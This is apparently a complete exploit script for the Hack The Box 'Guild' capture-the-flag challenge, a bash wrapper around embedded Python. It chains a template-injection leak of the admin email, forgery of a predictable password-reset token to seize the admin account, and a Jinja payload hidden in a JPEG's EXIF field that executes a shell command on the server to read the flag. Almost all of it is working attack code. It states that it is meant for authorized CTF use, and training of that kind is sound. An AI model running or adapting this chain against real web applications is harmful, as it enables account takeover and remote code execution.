#!/usr/bin/env bash
set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Guild
# Type: Vulnerability chain (SSTI + predictable reset + EXIF SSTI RCE)
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=20

BASE_URL=""
HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<EOF
Usage:
  ${SCRIPT_NAME} <base_url>
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --base-url <url> [options]
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --base-url <url>      Target base URL (example: http://154.57.164.68:31870)
  --host <host>         Target host/IP
  --port <port>         Target port
  --timeout <seconds>   Request timeout (default: ${DEFAULT_TIMEOUT})
  --json                Print result as JSON
  --verbose             Enable verbose debug output
  -h, --help            Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/request failure
  4  Exploit chain failure
EOF
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_ok() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[+] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --base-url)
        BASE_URL="${2:-}"
        shift 2
        ;;
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${BASE_URL}" ]]; then
    if [[ ${#positional[@]} -eq 1 ]]; then
      BASE_URL="${positional[0]}"
    elif [[ ${#positional[@]} -ge 2 ]]; then
      HOST="${positional[0]}"
      PORT="${positional[1]}"
    fi
  fi

  if [[ -z "${BASE_URL}" ]]; then
    if [[ -n "${HOST}" && -n "${PORT}" ]]; then
      BASE_URL="http://${HOST}:${PORT}"
    fi
  fi

  if [[ -z "${BASE_URL}" ]]; then
    log_error "Provide either base URL or host+port."
    usage >&2
    exit 2
  fi
}

main() {
  parse_args "$@"

  log_info "Target: ${BASE_URL}"
  log_info "Executing full exploit chain..."

  local result
  if ! result="$(python3 - "$BASE_URL" "$TIMEOUT" "$VERBOSE" <<'PY'
import hashlib
import random
import re
import string
import sys

import requests
from PIL import Image

base = sys.argv[1].rstrip("/")
timeout = float(sys.argv[2])
verbose = sys.argv[3] == "1"

def die(code: int, msg: str) -> None:
    print(msg)
    raise SystemExit(code)


def rand_user():
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    username = f"u{suffix}"
    email = f"{username}@example.com"
    password = "pass123"
    return username, email, password


def extract_share_value(html_text):
    match = re.search(r'<p class="para-class">(.*?)</p>', html_text, re.S)
    if not match:
        raise RuntimeError("Could not extract rendered profile value from share page")
    return match.group(1).strip()


def upload_image(session, path, filename):
    with open(path, "rb") as handle:
        return session.post(f"{base}/verification", files={"file": (filename, handle, "image/jpeg")}, allow_redirects=True, timeout=timeout)


try:
    user, email, password = rand_user()
    if verbose:
        print(f"DBG_USER:{user}:{email}")

    user_session = requests.Session()
    user_session.post(f"{base}/signup", data={"email": email, "username": user, "password": password}, timeout=timeout)
    user_session.post(f"{base}/login", data={"username": user, "password": password}, allow_redirects=True, timeout=timeout)

    plain_path = "/tmp/guild_plain.jpg"
    Image.new("RGB", (1, 1), (255, 255, 255)).save(plain_path, "JPEG")
    upload_image(user_session, plain_path, f"{user}_plain.jpg")

    user_session.get(f"{base}/getlink", timeout=timeout)

    leak_admin_email = "{{User.query.filter_by(username='admin').first().email}}"
    user_session.post(f"{base}/profile", data={"bio": leak_admin_email}, timeout=timeout)
    share_response = user_session.get(f"{base}/user/{user}", timeout=timeout)
    admin_email = extract_share_value(share_response.text)
    if verbose:
        print(f"DBG_ADMIN_EMAIL:{admin_email}")

    if "@" not in admin_email:
        die(4, f"ERR_EMAIL_LEAK:{admin_email}")

    requests.post(f"{base}/forgetpassword", data={"email": admin_email}, timeout=timeout)
    reset_hash = hashlib.sha256(admin_email.encode()).hexdigest()
    new_admin_password = "GuildAdmin123!"

    reset_response = requests.post(
        f"{base}/changepasswd/{reset_hash}",
        data={"password": new_admin_password},
        allow_redirects=True,
        timeout=timeout,
    )
    if "Password Updated!" not in reset_response.text:
        die(4, "ERR_RESET_FAILED:Password reset did not succeed")

    admin_session = requests.Session()
    admin_login = admin_session.post(
        f"{base}/login",
        data={"username": "admin", "password": new_admin_password},
        allow_redirects=True,
        timeout=timeout,
    )
    if "/admin" not in admin_login.url:
        die(4, "ERR_ADMIN_LOGIN:Admin login failed")

    artist_payload = "{{lipsum.__globals__.os.popen('cat flag.txt').read()}}"
    malicious_path = "/tmp/guild_malicious.jpg"
    malicious_img = Image.new("RGB", (1, 1), (0, 0, 0))
    malicious_exif = Image.Exif()
    malicious_exif[315] = artist_payload
    malicious_img.save(malicious_path, "JPEG", exif=malicious_exif)

    upload_image(user_session, malicious_path, f"{user}_evil.jpg")

    admin_page = admin_session.get(f"{base}/admin", timeout=timeout)
    rows = re.findall(
        r'<td>(\d+)</td>\s*<td>' + re.escape(user) + r'</td>.*?name="user_id" value="\1".*?name="verification_id" value="(\d+)"',
        admin_page.text,
        re.S,
    )
    if not rows:
        die(4, "ERR_ROW_NOT_FOUND:Could not find verification row")

    user_id, verification_id = rows[-1]
    if verbose:
        print(f"DBG_ROW:{user_id}:{verification_id}")

    verify_response = admin_session.post(
        f"{base}/verify",
        data={"user_id": user_id, "verification_id": verification_id},
        timeout=timeout,
    )

    flag_match = re.search(r"HTB\{[^}]+\}", verify_response.text)
    if not flag_match:
        die(4, "ERR_FLAG_NOT_FOUND:Flag missing in verify response")

    print(f"OK_FLAG:{flag_match.group(0)}")
except requests.RequestException as exc:
    die(3, f"ERR_REQUEST:{exc}")
PY
  )"; then
    case "$?" in
      3) log_error "Connectivity/request failure."; exit 3 ;;
      4) log_error "Exploit chain failed."; exit 4 ;;
      *) log_error "Unexpected runtime failure."; exit 1 ;;
    esac
  fi

  log_debug "Exploit output: ${result}"
  local flag
  flag="$(printf '%s\n' "${result}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"
  if [[ -z "${flag}" ]]; then
    log_error "No flag extracted from output."
    exit 4
  fi

  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
    printf '{"target":"%s","flag":"%s"}\n' "${BASE_URL}" "${flag}"
  else
    log_ok "Flag extracted successfully."
    printf '%s\n' "${flag}"
  fi
}

main "$@"
